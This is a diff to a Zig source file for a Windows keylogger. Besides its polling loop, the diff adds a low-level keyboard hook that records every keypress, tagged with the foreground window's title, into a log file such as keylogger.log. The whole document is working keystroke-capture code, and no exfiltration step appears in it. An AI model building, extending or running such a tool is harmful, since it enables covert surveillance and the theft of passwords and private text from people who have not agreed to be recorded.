@@ -4,17 +4,74 @@ const std = @import("std");
 const Writer = std.Io.Writer;
 const eql = std.mem.eql;
 const f = std.fmt.bufPrint;
+const print = std.debug.print;
 
 const win = std.os.windows;
+// std.os.windows (0.17) lacks these message-type integers; define them here.
+const WPARAM = usize; // UINT_PTR
+const LPARAM = isize; // LONG_PTR
+const LRESULT = isize; // LONG_PTR
 extern "user32" fn GetForegroundWindow() callconv(.winapi) ?win.HWND;
 extern "user32" fn GetAsyncKeyState(vKey: i32) callconv(.winapi) i16;
 extern "user32" fn GetWindowTextA(hwnd: win.HWND, lpString: [*]u8, nMaxCount: i32) callconv(.winapi) i32;
+
+// Low-level keyboard hook API (used by the "hook" method).
+const HHOOK = *opaque {};
+const HOOKPROC = *const fn (c_int, WPARAM, LPARAM) callconv(.winapi) LRESULT;
+extern "user32" fn SetWindowsHookExA(idHook: c_int, lpfn: HOOKPROC, hmod: ?win.HINSTANCE, dwThreadId: win.DWORD) callconv(.winapi) ?HHOOK;
+extern "user32" fn UnhookWindowsHookEx(hhk: HHOOK) callconv(.winapi) win.BOOL;
+extern "user32" fn CallNextHookEx(hhk: ?HHOOK, nCode: c_int, wParam: WPARAM, lParam: LPARAM) callconv(.winapi) LRESULT;
+// Returns i32 (not BOOL): -1 on error, 0 on WM_QUIT, nonzero otherwise.
+extern "user32" fn GetMessageA(lpMsg: *MSG, hWnd: ?win.HWND, wMsgFilterMin: win.UINT, wMsgFilterMax: win.UINT) callconv(.winapi) i32;
+extern "user32" fn TranslateMessage(lpMsg: *const MSG) callconv(.winapi) win.BOOL;
+extern "user32" fn DispatchMessageA(lpMsg: *const MSG) callconv(.winapi) LRESULT;
+
+const WH_KEYBOARD_LL: c_int = 13;
+const HC_ACTION: c_int = 0;
+const WM_KEYDOWN: WPARAM = 0x0100;
+const WM_SYSKEYDOWN: WPARAM = 0x0104;
+
+const KBDLLHOOKSTRUCT = extern struct {
+    vkCode: win.DWORD,
+    scanCode: win.DWORD,
+    flags: win.DWORD,
+    time: win.DWORD,
+    dwExtraInfo: usize,
+};
+
+const POINT = extern struct { x: win.LONG, y: win.LONG };
+const MSG = extern struct {
+    hwnd: ?win.HWND,
+    message: win.UINT,
+    wParam: WPARAM,
+    lParam: LPARAM,
+    time: win.DWORD,
+    pt: POINT,
+    lPrivate: win.DWORD,
+};
 
 const PrevType = enum {
     init,
     window,
     key,
 };
+
+// Shared state for the hook callback. The low-level keyboard hook runs on the
+// same thread that pumps the message loop (main), so no synchronization is
+// needed. Populated in main() before the hook is installed.
+const Globals = struct {
+    io_writer: *Writer,
+    stdout: *Writer,
+    stderr: *Writer,
+    verbose: u8,
+    title_len_i: c_uint,
+    ctitle_b: []u8,
+    ptitle_b: []u8,
+    key_name_b: []u8,
+    prev_type: PrevType,
+    file_exists: bool,
+};
+var globals: Globals = undefined;
 
 pub fn main(init: std.process.Init) !void {
     const minimal = init.minimal;
@@ -95,9 +152,9 @@ pub fn main(init: std.process.Init) !void {
 
     if (arg_verbose >= 1) {
         try printHeader(stdout);
+        try stdout.print("method: {s}\n", .{@tagName(build_options.METHOD)});
         try stdout.print("output format: '{s}'\n", .{arg_output_format1.items});
         try stdout.print("output path:   '{s}'\n", .{arg_output_path_s});
-        try stdout.print("sleep: {d}\n", .{arg_sleep});
         try stdout.flush();
     }
 
@@ -105,7 +162,7 @@ pub fn main(init: std.process.Init) !void {
         .truncate = false,
         .read = true,
     });
-    defer file.close(io); // Actually never reached because of while(true) later below.
+    defer file.close(io); // Actually never reached because of the loop below.
 
     const writer_buf = try gpa.alloc(u8, 1024);
     defer gpa.free(writer_buf);
@@ -137,54 +194,150 @@ pub fn main(init: std.process.Init) !void {
     }
     for (0..key_len) |n| key_name_b[n] = 0;
 
-    var prev_type: PrevType = .init;
-    while (true) {
-        try io.sleep(.fromMilliseconds(arg_sleep), .real);
+    switch (build_options.METHOD) {
+        .loop => {
+            var prev_type: PrevType = .init;
+            while (true) {
+                try init.io.sleep(.fromMilliseconds(arg_sleep), .real);
 
-        const hwnd: win.HWND = GetForegroundWindow() orelse continue;
-        const ctitle_len = GetWindowTextA(hwnd, ctitle_b.ptr, title_len_i);
-        const ctitle_len_u: usize = @intCast(ctitle_len);
-        const ctitle_s: []u8 = ctitle_b[0..ctitle_len_u];
+                const hwnd: win.HWND = GetForegroundWindow() orelse continue;
+                const ctitle_len = GetWindowTextA(hwnd, ctitle_b.ptr, @intCast(title_len_i));
+                const ctitle_len_u: usize = @intCast(ctitle_len);
+                const ctitle_s: []u8 = ctitle_b[0..ctitle_len_u];
 
-        if (!eql(u8, ptitle_b, ctitle_b)) {
+                if (!eql(u8, ptitle_b, ctitle_b)) {
+                    if (arg_verbose >= 1) {
+                        try stdout.print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
+                        try stdout.flush();
+                    }
+                    switch (prev_type) {
+                        .init => {
+                            if (file_exists) {
+                                try io_writer.writeAll("\n");
+                            }
+                        },
+                        .window => {},
+                        .key => try io_writer.writeAll("\n"),
+                    }
+                    try io_writer.writeAll("window: '");
+                    try io_writer.writeAll(ctitle_s);
+                    try io_writer.writeAll("'\n");
+                    try io_writer.flush();
+                    @memcpy(ptitle_b, ctitle_b);
+                    prev_type = .window;
+                }
+
+                var key_i: u8 = 1;
+                while (key_i < 255) : (key_i += 1) {
+                    const key_state: win.SHORT = GetAsyncKeyState(key_i);
+                    if (key_state & 1 != 0) {
+                        const key_name_s = try getKeyName(key_name_b, key_i);
+                        if (arg_verbose >= 1) {
+                            try stdout.print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
+                            try stdout.flush();
+                        }
+                        try io_writer.writeAll(key_name_s);
+                        try io_writer.flush();
+                        prev_type = .key;
+                    }
+                }
+            }
+        },
+        .hook => {
+            // Publish state for the hook callback, then install the hook.
+            globals = .{
+                .io_writer = io_writer,
+                .stdout = stdout,
+                .stderr = stderr,
+                .verbose = arg_verbose,
+                .title_len_i = title_len_i,
+                .ctitle_b = ctitle_b,
+                .ptitle_b = ptitle_b,
+                .key_name_b = key_name_b,
+                .prev_type = .init,
+                .file_exists = file_exists,
+            };
             if (arg_verbose >= 1) {
-                try stdout.print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
+                try stdout.print("setup hook\n", .{});
                 try stdout.flush();
             }
-            switch (prev_type) {
-                .init => {
-                    if (file_exists) {
-                        try io_writer.writeAll("\n");
-                    }
-                },
-                .window => {},
-                .key => try io_writer.writeAll("\n"),
-            }
-            try io_writer.writeAll("window: '");
-            try io_writer.writeAll(ctitle_s);
-            try io_writer.writeAll("'\n");
-            try io_writer.flush();
-            @memcpy(ptitle_b, ctitle_b);
-            prev_type = .window;
-        }
+            const hook = SetWindowsHookExA(WH_KEYBOARD_LL, &lowLevelKeyboardProc, null, 0) orelse {
+                try stderr.print("ERROR: SetWindowsHookExA failed\n", .{});
+                try stderr.flush();
+                return;
+            };
+            defer _ = UnhookWindowsHookEx(hook);
 
-        var key_i: u8 = 1;
-        while (key_i < 255) : (key_i += 1) {
-            const key_state: win.SHORT = GetAsyncKeyState(key_i);
-            if (key_state & 1 != 0) {
-                const key_name_s = try getKeyName(key_name_b, key_i);
-                if (arg_verbose >= 1) {
-                    try stdout.print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
-                    try stdout.flush();
-                }
-                try io_writer.writeAll(key_name_s);
-                try io_writer.flush();
-                prev_type = .key;
+            if (arg_verbose >= 1) {
+                try stdout.print("main wait\n", .{});
+                try stdout.flush();
             }
-        }
+
+            // Pump the message queue. The low-level keyboard hook is dispatched by
+            // the OS while this thread waits in GetMessage; zero CPU when idle.
+            var msg: MSG = undefined;
+            while (GetMessageA(&msg, null, 0, 0) > 0) {
+                try stdout.print("main GetMessageA\n", .{});
+                try stdout.flush();
+
+                _ = TranslateMessage(&msg);
+                _ = DispatchMessageA(&msg);
+            }
+        },
     }
+
     try io_writer.flush();
     try file_writer.flush();
+}
+
+// Low-level keyboard hook callback. Runs on the main thread during GetMessage.
+fn lowLevelKeyboardProc(nCode: c_int, wParam: WPARAM, lParam: LPARAM) callconv(.winapi) LRESULT {
+    if (nCode == HC_ACTION and (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN)) {
+        const kb: *const KBDLLHOOKSTRUCT = @ptrFromInt(@as(usize, @bitCast(lParam)));
+        const ki: u8 = @truncate(kb.vkCode);
+        handleKey(ki) catch {};
+    }
+    return CallNextHookEx(null, nCode, wParam, lParam);
+}
+
+// Log one key press, writing a window header first when the foreground window
+// changed since the last recorded key.
+fn handleKey(ki: u8) !void {
+    const hwnd: win.HWND = GetForegroundWindow() orelse return;
+    const ctitle_len = GetWindowTextA(hwnd, globals.ctitle_b.ptr, @intCast(globals.title_len_i));
+    const ctitle_len_u: usize = @intCast(ctitle_len);
+    const ctitle_s: []u8 = globals.ctitle_b[0..ctitle_len_u];
+
+    if (!eql(u8, globals.ptitle_b, globals.ctitle_b)) {
+        if (globals.verbose >= 1) {
+            try globals.stdout.print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
+            try globals.stdout.flush();
+        }
+        switch (globals.prev_type) {
+            .init => {
+                if (globals.file_exists) {
+                    try globals.io_writer.writeAll("\n");
+                }
+            },
+            .window => {},
+            .key => try globals.io_writer.writeAll("\n"),
+        }
+        try globals.io_writer.writeAll("window: '");
+        try globals.io_writer.writeAll(ctitle_s);
+        try globals.io_writer.writeAll("'\n");
+        try globals.io_writer.flush();
+        @memcpy(globals.ptitle_b, globals.ctitle_b);
+        globals.prev_type = .window;
+    }
+
+    const key_name_s = try getKeyName(globals.key_name_b, ki);
+    if (globals.verbose >= 1) {
+        try globals.stdout.print("key: '{s}' ({d})\n", .{ key_name_s, ki });
+        try globals.stdout.flush();
+    }
+    try globals.io_writer.writeAll(key_name_s);
+    try globals.io_writer.flush();
+    globals.prev_type = .key;
 }
 
 fn printHeader(stdout: *Writer) !void {
@@ -202,7 +355,7 @@ fn printHelp(stdout: *Writer) !void {
         \\-v, --verbose             Verbose output.
         \\-o, --output <path>       Output file path. Accepts datetime format. Default: keylogger.log
         \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
-        \\-s, --sleep <msec>        Time to sleep in milliseconds. Default: 10
+        \\-s, --sleep <msec>        Time to sleep in milliseconds (default method only). Default: 10
     ;
     try stdout.print(help ++ "\n", .{});
     try stdout.flush();
